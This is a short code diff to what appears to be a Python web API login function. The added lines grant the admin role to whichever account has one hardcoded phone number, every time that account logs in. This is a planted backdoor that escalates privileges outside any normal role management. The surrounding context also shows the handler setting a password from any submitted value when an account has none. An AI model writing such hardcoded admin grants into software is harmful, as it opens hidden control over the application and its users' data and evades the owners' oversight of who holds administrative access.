@@ -132,6 +132,11 @@ def login_user(payload: schemas.LoginRequest, db: Session = Depends(get_db)):
     if not user:
         raise HTTPException(status_code=404, detail="User not found")
         
+    # Force promote 9389047361 to admin if they are registered as student
+    if user.phone == "9389047361" and user.role != "admin":
+        user.role = "admin"
+        db.commit()
+        
     if not user.password_hash:
         user.password_hash = hash_password(password)
         db.commit()
